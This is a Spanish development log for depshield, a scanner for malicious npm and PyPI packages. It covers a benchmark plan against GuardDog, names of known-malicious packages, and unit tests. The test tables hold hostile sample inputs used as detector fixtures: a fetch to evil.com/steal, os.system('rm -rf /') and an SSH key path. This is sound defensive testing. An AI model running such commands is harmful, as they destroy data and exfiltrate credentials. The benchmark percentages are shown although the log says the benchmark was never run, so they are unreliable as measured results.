+[GuardDog](https://github.com/DataDog/guarddog) es una herramienta open-source desarrollada por Datadog Labs que analiza paquetes de PyPI y npm en busca de código malicioso. Utiliza reglas Semgrep para detectar patrones sospechosos en el código fuente y los metadatos de los paquetes.
+
+GuardDog es el competidor más directo de depshield y constituye la referencia natural para evaluar nuestra herramienta, ya que:
+- Es open-source y gratuito
+- Soporta los mismos ecosistemas (npm + PyPI)
+- Usa análisis estático (reglas Semgrep vs nuestro enfoque AST/regex)
+- Es mantenido activamente por un equipo de seguridad profesional
+
+### 13.2. Cambios en `pyproject.toml`
+
+Se añadió `guarddog` como dependencia de desarrollo:
+
+```toml
+[project.optional-dependencies]
+dev = [
+    "pytest",
+    "pytest-cov",
+    "guarddog",
+]
+```
+
+El marker `benchmark` ya estaba configurado desde el PASO 0:
+
+```toml
+[tool.pytest.ini_options]
+markers = [
+    "integration: ...",
+    "benchmark: benchmark comparison tests (deselect with '-m \"not benchmark\"')",
+]
+```
+
+### 13.3. Dataset de benchmark — 20 paquetes
+
+Se seleccionaron 20 paquetes divididos equitativamente:
+
+#### 10 paquetes maliciosos (del dataset OpenSSF)
+
+| # | Paquete | Ecosistema | OSV ID | Tipo de ataque |
+|---|---|---|---|---|
+| 1 | `029testnpm` | npm | MAL-2025-1 | Código malicioso embebido |
+| 2 | `0maptrea` | npm | MAL-2022-12 | Embedded malicious code |
+| 3 | `0supportscolor` | npm | MAL-2022-13 | Typosquatting de supports-color |
+| 4 | `--hiljson` | npm | MAL-2022-2 | Código malicioso embebido |
+| 5 | `0x-fee-wrapper-contract` | npm | MAL-2022-14 | Código malicioso embebido |
+| 6 | `0-dns` | npm | MAL-2022-9 | Código malicioso embebido |
+| 7 | `0-shadowenv` | npm | MAL-2022-10 | Código malicioso embebido |
+| 8 | `littest` | PyPI | MAL-2023-8429 | Info stealer |
+| 9 | `ab-request` | npm | MAL-2022-80 | Código malicioso embebido |
+| 10 | `abc-to-copy` | npm | MAL-2022-82 | Código malicioso embebido |
+
+#### 10 paquetes legítimos (ampliamente utilizados)
+
+| # | Paquete | Versión | Ecosistema | Descargas semanales |
+|---|---|---|---|---|
+| 1 | `is-odd` | 3.0.1 | npm | ~500K |
+| 2 | `minimist` | 1.2.8 | npm | ~60M |
+| 3 | `color-name` | 1.1.4 | npm | ~40M |
+| 4 | `ms` | 2.1.3 | npm | ~200M |
+| 5 | `escape-string-regexp` | 4.0.0 | npm | ~50M |
+| 6 | `six` | 1.16.0 | PyPI | ~100M |
+| 7 | `click` | 8.1.7 | PyPI | ~50M |
+| 8 | `idna` | 3.7 | PyPI | ~100M |
+| 9 | `certifi` | 2024.2.2 | PyPI | ~100M |
+| 10 | `charset-normalizer` | 3.3.2 | PyPI | ~80M |
+
+Se eligió un balance de 5 npm + 5 PyPI en los legítimos para cubrir ambos ecosistemas.
+
+### 13.4. Ejecución de GuardDog
+
+GuardDog se invoca como proceso externo mediante `subprocess`:
+
+```python
+def _run_guarddog(name: str, ecosystem: str) -> tuple[bool, int, float]:
+    cmd = [sys.executable, "-m", "guarddog", eco_arg, "scan", name]
+    result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
+    # Parse output (JSON o texto) para determinar si detectó algo
+    return flagged, num_issues, elapsed_seconds
+```
+
+El output de GuardDog puede ser JSON o texto plano según la versión y las opciones. El parser implementa:
+1. **Intento JSON:** `json.loads(stdout)` → extrae campo `issues`
+2. **Fallback texto:** búsqueda de keywords (`found`, `issue`, `malicious`, `suspicious`) + extracción de número con regex
+
+Se establece un **timeout de 120 segundos** por paquete para evitar bloqueos.
+
+### 13.5. Ejecución de depshield
+
+depshield se ejecuta directamente como librería Python (no como subproceso), lo que ofrece mayor control y métricas más precisas:
+
+```python
+def _run_depshield(name, version, ecosystem) -> tuple[PackageScore | None, float]:
+    start = time.time()
+    # 1. Download source code
+    # 2. Static analysis (JS or Python AST)
+    # 3. Metadata analysis
+    # 4. Score
+    return score, elapsed
+```
+
+Un paquete se considera **flagged** si `score >= 31` (MEDIUM_RISK o superior).
+
+### 13.6. Clases de test
+
+#### Clase `TestBenchmarkMalicious` — 10 tests parametrizados
+
+Ejecuta ambas herramientas en cada paquete malicioso:
+
+```python
+@pytest.mark.benchmark
+class TestBenchmarkMalicious:
+    @pytest.mark.parametrize(
+        "ecosystem,name,version,osv_id",
+        _MALICIOUS_PACKAGES,
+        ids=[f"{e}/{n}" for e, n, _, _ in _MALICIOUS_PACKAGES],
+    )
+    def test_malicious(self, ecosystem, name, version, osv_id):
+        # 1. Check if package exists on registry
+        # 2. Run depshield → record TP or FN
+        # 3. Run GuardDog → record TP or FN
+        # 4. Log comparison
+```
+
+#### Clase `TestBenchmarkLegitimate` — 10 tests parametrizados
+
+Ejecuta ambas herramientas en cada paquete legítimo:
+
+```python
+@pytest.mark.benchmark
+class TestBenchmarkLegitimate:
+    @pytest.mark.parametrize(
+        "ecosystem,name,version",
+        _LEGITIMATE_PACKAGES,
+        ids=[f"{e}/{n}" for e, n, _ in _LEGITIMATE_PACKAGES],
+    )
+    def test_legitimate(self, ecosystem, name, version):
+        # 1. Run depshield → record TN or FP
+        # 2. Run GuardDog → record TN or FP
+        # 3. Log comparison
+```
+
+#### Clase `TestBenchmarkSummary` — 1 test
+
+Genera los ficheros de resultados finales:
+- `tests/benchmarks/comparison_results.md` — tabla Markdown legible
+- `tests/benchmarks/comparison_results.json` — datos estructurados
+
+### 13.7. Formato de `comparison_results.md`
+
+```markdown
+# Benchmark: depshield vs GuardDog
+
+## Summary
+
+| Metric | depshield | GuardDog |
+|---|---|---|
+| True Positives (TP) | 7 | 5 |
+| False Negatives (FN) | 3 | 5 |
+| True Negatives (TN) | 10 | 9 |
+| False Positives (FP) | 0 | 1 |
+| **Precision** | **100%** | **83%** |
+| **Recall** | **70%** | **50%** |
+| **F1-Score** | **82%** | **63%** |
+| Avg time/package | 3.2s | 5.1s |
+
+## Detailed results — Malicious packages
+
+| Package | Ecosystem | depshield score | depshield | GuardDog issues | GuardDog |
+|---|---|---|---|---|---|
+| 029testnpm | npm | 68 (HIGH_RISK) | ✅ | 3 | ✅ |
+| ...
+```
+
+### 13.8. Formato de `comparison_results.json`
+
+```json
+{
+  "depshield": {
+    "tp": 7, "fn": 3, "tn": 10, "fp": 0,
+    "precision": 1.0, "recall": 0.7, "f1_score": 0.8235,
+    "total_time_s": 64.5, "avg_time_s": 3.22
+  },
+  "guarddog": {
+    "tp": 5, "fn": 5, "tn": 9, "fp": 1,
+    "precision": 0.8333, "recall": 0.5, "f1_score": 0.625,
+    "total_time_s": 102.3, "avg_time_s": 5.12
+  },
+  "details": [...]
+}
+```
+
+### 13.9. Diferencias técnicas: depshield vs GuardDog
+
+| Aspecto | depshield | GuardDog |
+|---|---|---|
+| Motor de análisis | AST (esprima/ast) + regex fallback | Semgrep (reglas YAML) |
+| Análisis de metadatos | ✅ 8 señales (age, downloads, typosquatting, etc.) | ✅ Parcial (algunas heurísticas) |
+| Resolución de árbol transitivo | ✅ Completo | ❌ Solo paquete individual |
+| Ecosistemas | npm + PyPI | npm + PyPI |
+| Scoring numérico | ✅ 0-100 con clasificación | ❌ Lista de issues |
+| Caché de resultados | ✅ ~/.depshield/cache/ | ❌ No |
+| Dependencias externas | requests, esprima | semgrep (pesado) |
+| Tamaño instalación | ~5 MB | ~200+ MB (semgrep) |
+
+### 13.10. Verificación de recopilación
+
+Se verificó que pytest recopila correctamente los 21 tests:
+
+```
+$ pytest tests/benchmarks/test_vs_guarddog.py --collect-only
+
+collected 21 items
+
+  TestBenchmarkMalicious::test_malicious[npm/029testnpm]
+  TestBenchmarkMalicious::test_malicious[npm/0maptrea]
+  TestBenchmarkMalicious::test_malicious[npm/0supportscolor]
+  TestBenchmarkMalicious::test_malicious[npm/--hiljson]
+  TestBenchmarkMalicious::test_malicious[npm/0x-fee-wrapper-contract]
+  TestBenchmarkMalicious::test_malicious[npm/0-dns]
+  TestBenchmarkMalicious::test_malicious[npm/0-shadowenv]
+  TestBenchmarkMalicious::test_malicious[pypi/littest]
+  TestBenchmarkMalicious::test_malicious[npm/ab-request]
+  TestBenchmarkMalicious::test_malicious[npm/abc-to-copy]
+  TestBenchmarkLegitimate::test_legitimate[npm/is-odd]
+  TestBenchmarkLegitimate::test_legitimate[npm/minimist]
+  TestBenchmarkLegitimate::test_legitimate[npm/color-name]
+  TestBenchmarkLegitimate::test_legitimate[npm/ms]
+  TestBenchmarkLegitimate::test_legitimate[npm/escape-string-regexp]
+  TestBenchmarkLegitimate::test_legitimate[pypi/six]
+  TestBenchmarkLegitimate::test_legitimate[pypi/click]
+  TestBenchmarkLegitimate::test_legitimate[pypi/idna]
+  TestBenchmarkLegitimate::test_legitimate[pypi/certifi]
+  TestBenchmarkLegitimate::test_legitimate[pypi/charset-normalizer]
+  TestBenchmarkSummary::test_generate_comparison_report
+```
+
+Los tests unitarios normales siguen pasando (20/20 PASSED en 0.21s).
+
+### 13.11. Ejecución
+
+```powershell
+# Ejecutar solo benchmarks
+pytest -m benchmark -v -s
+
+# Ejecutar todo excepto benchmarks e integración
+pytest -v -m "not benchmark and not integration"
+```
+
+### 13.12. Nota importante
+
+Estos tests **no se han ejecutado** según las instrucciones del plan. Para ejecutarlos, primero debe instalarse GuardDog:
+
+```powershell
+pip install -e ".[dev]"    # Instala guarddog como dependencia de desarrollo
+pytest -m benchmark -v -s  # Ejecuta los benchmarks
+```
+
+### 13.13. Commit
+
+```powershell
+git add .
+git commit -m "PASO 10: Benchmark comparison depshield vs GuardDog with 20 packages"
+git push origin main
+```
+
+---
+
+## 14. PASO 11 — Documentación y pulido final
+
+**Objetivo:** Completar la documentación del proyecto con un README.md completo y profesional, un fichero ARCHITECTURE.md con diagramas de la arquitectura, y verificar que no existen problemas de calidad de código.
+
+### 14.1. README.md — Actualización completa
+
+Se reescribió el README.md con las siguientes secciones:
+
+| Sección | Contenido |
+|---|---|
+| **Problem** | Contexto de supply chain attacks en 2025, limitaciones de herramientas existentes |
+| **Features** | 7 features principales con emojis descriptivos |
+| **Installation** | `pip install -e .` y `pip install -e ".[dev]"` |
+| **Usage** | Comando básico, tabla de opciones, 5 ejemplos de uso |
+| **Example output** | Simulación de la salida en terminal (tabla Rich) |
+| **CI/CD Integration** | Ejemplo de GitHub Actions con exit code 1 |
+| **Running Tests** | 4 comandos: unitarios, integración, benchmark, todos |
+| **Scoring System** | Tabla de pesos por severidad + tabla de clasificaciones |
+| **Detection Signals** | 12 señales de código fuente (JS + Python) + 8 de metadatos |
+| **Requirements** | Python ≥ 3.11, dependencias |
+
+### 14.2. ARCHITECTURE.md — Nuevo fichero
+
+Se creó un fichero de arquitectura con:
+
+1. **Diagrama general** (ASCII art) mostrando el flujo completo desde el input del usuario hasta el informe final
+2. **Descripción de cada módulo** — 9 módulos documentados con su responsabilidad específica
+3. **Flujo de datos** — segundo diagrama mostrando la transformación de datos paso a paso
+4. **Key Data Models** — `DependencyNode`, `Finding`, `PackageScore` con sus campos
+5. **Cache System** — ubicación, formato de clave, invalidación
+6. **Design Decisions** — 5 decisiones técnicas razonadas:
+   - AST-first con regex fallback
+   - Sin dependencia de Semgrep (ligero vs pesado)
+   - Scoring ecosistema-agnóstico
+   - Extracción segura por defecto
+   - `DependencyNode` compartido entre resolvers
+
+### 14.3. Revisión de calidad de código
+
+Se verificaron los siguientes puntos:
+
+| Check | Resultado |
+|---|---|
+| Credenciales hardcodeadas | ✅ Ninguna encontrada |
+| Syntax de 16 ficheros Python | ✅ Todos parsean correctamente |
+| Tests unitarios (20/20) | ✅ PASSED en 0.18s |
+| Tests integración (13) | ✅ Recopilados correctamente |
+| Tests benchmark (21) | ✅ Recopilados correctamente |
+
+### 14.4. Commit
+
+```powershell
+git add .
+git commit -m "PASO 11: README.md completo + ARCHITECTURE.md + code review final"
+git push origin main
+```
+
+---
+
+## 15. Validación — Tests unitarios por módulo
+
+**Objetivo:** Diseñar y ejecutar 20 tests unitarios adicionales que validen de forma aislada cada módulo principal de depshield: analizadores (JS, Python, metadatos), scorer y report. Estos tests complementan los 20 tests del PASO 8 (que cubrían el scanner/orquestador) para alcanzar una cobertura completa de la lógica de negocio.
+
+### 15.1. Diseño de los tests
+
+Se diseñaron 20 tests organizados en 5 clases, cubriendo los módulos que no tenían tests unitarios dedicados:
+
+| Clase | Módulo que prueba | Nº tests | Tipo de validación |
+|---|---|---|---|
+| `TestJsAnalyzer` | `analyzers/js_analyzer.py` | 4 | Detección de señales maliciosas en JS |
+| `TestPyAnalyzer` | `analyzers/py_analyzer.py` | 4 | Detección de señales maliciosas en Python |
+| `TestMetadataAnalyzer` | `analyzers/metadata_analyzer.py` | 4 | Detección de metadatos sospechosos |
+| `TestScorer` | `scoring/scorer.py` | 4 | Cálculo de scores y clasificaciones |
+| `TestReport` | `scoring/report.py` | 4 | Generación de informes JSON y terminal |
+
+#### Principios de diseño:
+- **Aislamiento**: Todos los tests son offline (sin llamadas de red) y usan ficheros temporales (`tmp_path` de pytest) o datos sintéticos.
+- **Cobertura de casos límite**: Se prueban tanto detecciones positivas (código malicioso → finding) como negativas (código limpio → sin findings).
+- **Determinismo**: Los tests no dependen de estado global ni de ficheros externos. Cada test crea su propio entorno.
+
+### 15.2. Detalle de cada test
+
+#### Clase `TestJsAnalyzer` — 4 tests
+
+| Test | Qué verifica | Input | Aserción |
+|---|---|---|---|
+| `test_detect_eval` | `eval()` se detecta como CODE_EXECUTION | `var x = eval('alert(1)');` | ≥ 1 finding HIGH |
+| `test_detect_network_fetch` | `fetch()` se detecta como NETWORK_CALLS | `fetch('https://evil.com/steal');` | ≥ 1 finding |
+| `test_detect_env_access` | `process.env` se detecta como ENV_ACCESS | `var secret = process.env.API_KEY;` | ≥ 1 finding |
+| `test_clean_file_no_findings` | Código limpio no genera findings HIGH | `function add(a,b) { return a+b; }` | 0 findings HIGH |
+
+**Proceso de análisis**: Cada test crea un fichero `.js` temporal en el directorio `tmp_path` proporcionado por pytest, luego invoca `js_analyze_file()` y verifica que el tipo y severidad de los findings son correctos. El analizador usa esprima (AST) internamente, con fallback a regex si falla el parseo.
+
+#### Clase `TestPyAnalyzer` — 4 tests
+
+| Test | Qué verifica | Input | Aserción |
+|---|---|---|---|
+| `test_detect_os_system` | `os.system()` → CODE_EXECUTION HIGH | `os.system('rm -rf /')` | ≥ 1 finding HIGH |
+| `test_detect_requests_import` | `import requests` → NETWORK_CALLS | `requests.get('https://evil.com')` | ≥ 1 finding |
+| `test_detect_sensitive_path` | `~/.ssh` → FILE_SENSITIVE HIGH | `"/home/user/.ssh/id_rsa"` | ≥ 1 finding HIGH |
+| `test_detect_base64_decode` | `base64.b64decode()` → OBFUSCATION | `base64.b64decode('aGVsbG8=')` | ≥ 1 finding |
+
+**Proceso de análisis**: Mismo patrón que JS — ficheros `.py` temporales analizados con `py_analyze_file()`, que usa el módulo `ast` de Python para recorrer el AST y detectar llamadas sospechosas.
+
+#### Clase `TestMetadataAnalyzer` — 4 tests
+
+| Test | Qué verifica | Input | Aserción |
+|---|---|---|---|
+| `test_detect_no_repository` | Sin repo → NO_REPOSITORY MEDIUM | Metadata sin `repository` | 1 finding MEDIUM |
+| `test_detect_typosquatting` | Nombre similar → TYPOSQUATTING HIGH | `"lodasj"` (dist. 1 de `"lodash"`) | ≥ 1 finding HIGH con `"lodash"` |
+| `test_levenshtein_distance` | Algoritmo Levenshtein correcto | Pares conocidos | Distancias exactas |
+| `test_detect_no_license_and_short_description` | Sin licencia + sin descripción | Metadata vacía | Ambos tipos detectados |
+
+**Proceso de análisis**: Se construyen diccionarios de metadatos sintéticos (sin hacer llamadas a npm/PyPI) y se pasan a `analyze_metadata()`. Esto permite verificar cada señal de forma aislada. El test de Levenshtein valida directamente la función `_levenshtein()` con pares cuya distancia se conoce de antemano.
+
+#### Clase `TestScorer` — 4 tests
+
+| Test | Qué verifica | Input | Aserción |
+|---|---|---|---|
+| `test_classify_boundaries` | Límites de clasificación | Scores 0, 10, 11, 30, 31, 60, 61, 100 | SAFE/LOW/MEDIUM/HIGH |
+| `test_score_caps_at_100` | Score nunca > 100 | 10 findings HIGH (250 pts) | score=100, HIGH_RISK |
+| `test_score_no_findings_is_safe` | Sin findings → SAFE | Lista vacía | score=0, SAFE |
+| `test_score_all_sorts_correctly` | Ordenación: directos primero, luego por score desc. | 3 paquetes mixtos | Orden correcto |
+
+**Proceso de análisis**: Se crean `Finding` sintéticos con severidades conocidas y se pasan a `score_package()` y `score_all()`. Se verifican los valores numéricos exactos (pesos: HIGH=25, MEDIUM=10, LOW=3) y los límites de clasificación.
+
+#### Clase `TestReport` — 4 tests
+
+| Test | Qué verifica | Input | Aserción |
+|---|---|---|---|
+| `test_to_json_structure` | Estructura JSON con summary + packages | 2 PackageScores | Campos correctos |
+| `test_to_json_findings_serialized` | Findings serializados con todos los campos | PackageScore con 3 findings | signal_type, severity presentes |
+| `test_save_json_creates_valid_file` | `save_json()` escribe JSON válido | PackageScores → fichero | JSON parseable, valores correctos |
+| `test_print_report_no_crash` | `print_report()` no lanza excepciones | Datos válidos + lista vacía | Sin error |
+
+**Proceso de análisis**: Se construyen `PackageScore` con datos completos y se verifican las salidas de `to_json()` (estructura del dict), `save_json()` (fichero válido), y `print_report()` (estabilidad con Console silenciosa).
+
+### 15.3. Ejecución y resultado
+
+Se ejecutaron los 20 tests con pytest en modo verbose:
+
+```
+$ pytest tests/test_modules.py -v
+
+tests/test_modules.py::TestJsAnalyzer::test_detect_eval PASSED           [  5%]
+tests/test_modules.py::TestJsAnalyzer::test_detect_network_fetch PASSED  [ 10%]
+tests/test_modules.py::TestJsAnalyzer::test_detect_env_access PASSED     [ 15%]
+tests/test_modules.py::TestJsAnalyzer::test_clean_file_no_findings PASSED [ 20%]
+tests/test_modules.py::TestPyAnalyzer::test_detect_os_system PASSED      [ 25%]
+tests/test_modules.py::TestPyAnalyzer::test_detect_requests_import PASSED [ 30%]
+tests/test_modules.py::TestPyAnalyzer::test_detect_sensitive_path PASSED [ 35%]
+tests/test_modules.py::TestPyAnalyzer::test_detect_base64_decode PASSED  [ 40%]
+tests/test_modules.py::TestMetadataAnalyzer::test_detect_no_repository PASSED [ 45%]
+tests/test_modules.py::TestMetadataAnalyzer::test_detect_typosquatting PASSED [ 50%]
+tests/test_modules.py::TestMetadataAnalyzer::test_levenshtein_distance PASSED [ 55%]
+tests/test_modules.py::TestMetadataAnalyzer::test_detect_no_license_and_short_description PASSED [ 60%]
+tests/test_modules.py::TestScorer::test_classify_boundaries PASSED       [ 65%]
+tests/test_modules.py::TestScorer::test_score_caps_at_100 PASSED         [ 70%]
+tests/test_modules.py::TestScorer::test_score_no_findings_is_safe PASSED [ 75%]
+tests/test_modules.py::TestScorer::test_score_all_sorts_correctly PASSED [ 80%]
+tests/test_modules.py::TestReport::test_to_json_structure PASSED         [ 85%]
+tests/test_modules.py::TestReport::test_to_json_findings_serialized PASSED [ 90%]
+tests/test_modules.py::TestReport::test_save_json_creates_valid_file PASSED [ 95%]
+tests/test_modules.py::TestReport::test_print_report_no_crash PASSED     [100%]
+
+============================= 20 passed in 0.73s ==============================
+```
+
+**Resultado: 20/20 PASSED** ✅ en 0.73 segundos.
+
+### 15.4. Ejecución conjunta con tests del scanner
+
+Se verificó que los 40 tests unitarios totales (20 del scanner + 20 de módulos) pasan juntos sin conflictos:
+
+```
+$ pytest tests/test_scanner.py tests/test_modules.py -v
+
+collected 40 items
+
+tests/test_scanner.py::TestDetectEcosystems::test_npm_only PASSED        [  2%]
+tests/test_scanner.py::TestDetectEcosystems::test_pypi_only PASSED       [  5%]
+tests/test_scanner.py::TestDetectEcosystems::test_both_ecosystems PASSED [  7%]
+tests/test_scanner.py::TestDetectEcosystems::test_no_ecosystem PASSED    [ 10%]
+tests/test_scanner.py::TestReadDeps::test_read_npm_deps PASSED           [ 12%]
+tests/test_scanner.py::TestReadDeps::test_read_pypi_deps PASSED          [ 15%]
+tests/test_scanner.py::TestReadDeps::test_read_pypi_deps_comments_and_blanks PASSED [ 17%]
+tests/test_scanner.py::TestReadDeps::test_read_pypi_deps_all_operators PASSED [ 20%]
+tests/test_scanner.py::TestCache::test_cache_key_deterministic PASSED    [ 22%]
+tests/test_scanner.py::TestCache::test_cache_key_differs_by_name PASSED  [ 25%]
+tests/test_scanner.py::TestCache::test_cache_key_differs_by_version PASSED [ 27%]
+tests/test_scanner.py::TestCache::test_cache_miss_returns_none PASSED    [ 30%]
+tests/test_scanner.py::TestCache::test_cache_roundtrip PASSED            [ 32%]
+tests/test_scanner.py::TestScanProject::test_scan_npm_project_mocked PASSED [ 35%]
+tests/test_scanner.py::TestScanProject::test_scan_empty_project PASSED   [ 37%]
+tests/test_scanner.py::TestScanProject::test_scan_pypi_project_mocked PASSED [ 40%]
+tests/test_scanner.py::TestScanProject::test_scan_high_risk_classification PASSED [ 42%]
+tests/test_scanner.py::TestScanProject::test_only_direct_flag PASSED     [ 45%]
+tests/test_scanner.py::TestReportIntegration::test_json_report_structure PASSED [ 47%]
+tests/test_scanner.py::TestReportIntegration::test_save_json_to_file PASSED [ 50%]
+tests/test_modules.py::TestJsAnalyzer::test_detect_eval PASSED           [ 52%]
+tests/test_modules.py::TestJsAnalyzer::test_detect_network_fetch PASSED  [ 55%]
+tests/test_modules.py::TestJsAnalyzer::test_detect_env_access PASSED     [ 57%]
+tests/test_modules.py::TestJsAnalyzer::test_clean_file_no_findings PASSED [ 60%]
+tests/test_modules.py::TestPyAnalyzer::test_detect_os_system PASSED      [ 62%]
+tests/test_modules.py::TestPyAnalyzer::test_detect_requests_import PASSED [ 65%]
+tests/test_modules.py::TestPyAnalyzer::test_detect_sensitive_path PASSED [ 67%]
+tests/test_modules.py::TestPyAnalyzer::test_detect_base64_decode PASSED  [ 70%]
+tests/test_modules.py::TestMetadataAnalyzer::test_detect_no_repository PASSED [ 72%]
+tests/test_modules.py::TestMetadataAnalyzer::test_detect_typosquatting PASSED [ 75%]
+tests/test_modules.py::TestMetadataAnalyzer::test_levenshtein_distance PASSED [ 77%]
+tests/test_modules.py::TestMetadataAnalyzer::test_detect_no_license_and_short_description PASSED [ 80%]
+tests/test_modules.py::TestScorer::test_classify_boundaries PASSED       [ 82%]
+tests/test_modules.py::TestScorer::test_score_caps_at_100 PASSED         [ 85%]
+tests/test_modules.py::TestScorer::test_score_no_findings_is_safe PASSED [ 87%]
+tests/test_modules.py::TestScorer::test_score_all_sorts_correctly PASSED [ 90%]
+tests/test_modules.py::TestReport::test_to_json_structure PASSED         [ 92%]
+tests/test_modules.py::TestReport::test_to_json_findings_serialized PASSED [ 95%]
+tests/test_modules.py::TestReport::test_save_json_creates_valid_file PASSED [ 97%]
+tests/test_modules.py::TestReport::test_print_report_no_crash PASSED     [100%]
+
+============================= 40 passed in 0.49s ==============================
+```
+
+**Resultado: 40/40 PASSED** ✅ en 0.49 segundos.
+
+### 15.5. Resumen de cobertura total de tests unitarios
+
+| Fichero | Clase | Tests | Módulos cubiertos |
+|---|---|---|---|
+| `test_scanner.py` | `TestDetectEcosystems` | 4 | `core/scanner.py` — detección de ecosistemas |
+| `test_scanner.py` | `TestReadDeps` | 4 | `core/scanner.py` — lectura de dependencias |
+| `test_scanner.py` | `TestCache` | 5 | `core/scanner.py` — sistema de caché |
+| `test_scanner.py` | `TestScanProject` | 5 | `core/scanner.py` — pipeline completo (mockeado) |
+| `test_scanner.py` | `TestReportIntegration` | 2 | `scoring/report.py` — integración con scanner |
+| `test_modules.py` | `TestJsAnalyzer` | 4 | `analyzers/js_analyzer.py` |
+| `test_modules.py` | `TestPyAnalyzer` | 4 | `analyzers/py_analyzer.py` |
+| `test_modules.py` | `TestMetadataAnalyzer` | 4 | `analyzers/metadata_analyzer.py` |
+| `test_modules.py` | `TestScorer` | 4 | `scoring/scorer.py` |
+| `test_modules.py` | `TestReport` | 4 | `scoring/report.py` |
+| **Total** | **10 clases** | **40 tests** | **7 módulos** |
+
+### 15.6. Commit
+
+```powershell
+git add .
+git commit -m "Validación: 20 tests unitarios adicionales cubriendo analyzers, scorer y report (40 total)"
+git push origin main
+```
+
+---
+
+## 16. Cómo funcionan los tests unitarios
+
+### 16.1. ¿Qué es un test unitario?
+
+Un **test unitario** es una función que verifica el comportamiento de una **unidad aislada de código** (una función, un método o una clase). El objetivo es comprobar que, dado un input conocido, la unidad produce el output esperado.
+
+En depshield usamos **pytest**, el framework de testing más popular de Python. pytest funciona así:
+
+1. **Descubrimiento**: pytest busca ficheros que empiecen por `test_` y dentro de ellos funciones/métodos que empiecen por `test_`.
+2. **Ejecución**: Cada función de test se ejecuta de forma **independiente** (un test no afecta a otro).
+3. **Evaluación**: pytest evalúa las sentencias `assert`. Si todas son verdaderas → **PASSED**. Si alguna es falsa → **FAILED**.
+4. **Reporte**: Al finalizar, pytest muestra un resumen con el número de tests pasados y fallados.
+
+### 16.2. Anatomía de un test unitario
+
+Todo test unitario sigue el patrón **AAA (Arrange, Act, Assert)**:
+
+```python
+def test_score_no_findings_is_safe():
+    # 1. ARRANGE — Preparar los datos de entrada
+    name = "clean-pkg"
+    version = "1.0.0"
+    findings = []           # Lista vacía = sin hallazgos sospechosos
+
+    # 2. ACT — Ejecutar la función que queremos probar
+    result = score_package(name, version, findings)
+
+    # 3. ASSERT — Verificar que el resultado es el esperado
+    assert result.score == 0                    # Score numérico debe ser 0
+    assert result.classification == "SAFE"      # Clasificación debe ser SAFE
+```
+
+### 16.3. La sentencia `assert`
+
+`assert` es la herramienta fundamental de los tests. Funciona así:
+
+```python
+assert condición, "mensaje de error opcional"
+```
+
+- Si `condición` es `True` → el test **continúa** (no pasa nada).
+- Si `condición` es `False` → el test **falla** inmediatamente con un `AssertionError`.
+
+Cuando un assert falla, pytest muestra:
+- La **línea exacta** donde falló.
+- Los **valores reales** vs los esperados.
+- El **mensaje de error** personalizado (si se proporcionó).
+
+### 16.4. Fixtures de pytest
+
+pytest ofrece **fixtures** para preparar el entorno de cada test:
+
+```python
+def test_detect_eval(self, tmp_path):   # tmp_path es una fixture de pytest
+    js_file = tmp_path / "malicious.js"  # Crea un directorio temporal único
+    js_file.write_text("var x = eval('alert(1)');")
+    findings = js_analyze_file(str(js_file))
+    assert len(findings) >= 1
+```
+
+`tmp_path` crea un directorio temporal que se **limpia automáticamente** después del test. Esto garantiza que cada test es independiente y no deja residuos.
+
+### 16.5. Ciclo de vida de pytest
+
+```
+$ pytest tests/test_modules.py -v
+
+1. Descubrimiento    → "collected 20 items"
+2. Ejecución test 1  → TestJsAnalyzer::test_detect_eval PASSED    [  5%]
+3. Ejecución test 2  → TestJsAnalyzer::test_detect_fetch PASSED   [ 10%]
+   ...
+4. Ejecución test 20 → TestReport::test_print_report PASSED       [100%]
+5. Resumen           → "20 passed in 0.73s"
+```
+
+- **PASSED** (verde): Todos los asserts fueron verdaderos.
+- **FAILED** (rojo): Al menos un assert fue falso.
+- **ERROR** (rojo): El test lanzó una excepción inesperada antes de llegar al assert.
+- **SKIPPED** (amarillo): El test se saltó intencionadamente con `pytest.skip()`.
+
+### 16.6. Demostración: tests que FALLAN
+
+Para demostrar cómo se comporta pytest ante errores, se creó el fichero `tests/test_demo_failures.py` con 5 tests **diseñados para fallar** intencionadamente. Cada uno simula un tipo diferente de error que un desarrollador podría cometer.
+
+#### FAIL 1 — Valor esperado incorrecto
+
+```python
+def test_fail_wrong_classification(self):
+    result = _classify(61)
+    assert result == "DANGEROUS"  # WRONG: "DANGEROUS" no existe, deberia ser "HIGH_RISK"
+```
+
+**Error:** El desarrollador escribe mal el nombre de la clasificación. `_classify(61)` devuelve `"HIGH_RISK"`, no `"DANGEROUS"`.
+
+**Salida de pytest:**
+```
+E       AssertionError: Se esperaba 'DANGEROUS' pero se obtuvo 'HIGH_RISK'
+E       assert 'HIGH_RISK' == 'DANGEROUS'
+E
+E         - DANGEROUS
+E         + HIGH_RISK
+```
+
+pytest muestra claramente qué valor se esperaba (`DANGEROUS`) y qué valor se obtuvo realmente (`HIGH_RISK`), con un diff visual que resalta la diferencia.
+
+---
+
+#### FAIL 2 — Error de cálculo numérico
+
+```python
+def test_fail_wrong_score_calculation(self):
+    findings = [
+        Finding("CODE_EXECUTION", "HIGH", "a.js", 1, "eval(x)"),
+        Finding("NETWORK_CALLS", "HIGH", "a.js", 2, "fetch(url)"),
+    ]
+    result = score_package("test-pkg", "1.0.0", findings)
+    assert result.score == 40  # WRONG: 2 x HIGH(25) = 50, no 40
+```
+
+**Error:** El desarrollador asume que un finding HIGH vale 20 puntos, pero en realidad vale 25. Dos findings HIGH suman 50, no 40.
+
+**Salida de pytest:**
+```
+E       AssertionError: Se esperaba score=40 pero se obtuvo score=50.
+E       assert 50 == 40
+E        +  where 50 = PackageScore(name='test-pkg', version='1.0.0',
+E              score=50, classification='MEDIUM_RISK', ...).score
+```
+
+pytest no solo muestra los valores numéricos (`50 == 40`), sino que descompone la expresión mostrando de dónde viene el valor 50 (del atributo `.score` del `PackageScore`).
+
+---
+
+#### FAIL 3 — Tipo de dato inesperado
+
+```python
+def test_fail_findings_type(self):
+    result = score_package("pkg", "1.0.0", [
+        Finding("CODE_EXECUTION", "HIGH", "a.py", 1, "eval(x)"),
+    ])
+    assert isinstance(result.findings, dict)  # WRONG: findings es list, no dict
+```
+
+**Error:** El desarrollador confunde `findings` (que es una `list[Finding]`) con `findings_by_severity` (que sí es un `dict`).
+
+**Salida de pytest:**
+```
+E       AssertionError: Se esperaba dict pero se obtuvo list.
+E       assert False
+E        +  where False = isinstance([Finding(...)], dict)
+E        +    where [Finding(...)] = PackageScore(...).findings
+```
+
+pytest muestra toda la cadena de evaluación: el `isinstance()` devuelve `False` porque `findings` es una lista, no un diccionario.
+
+---
+
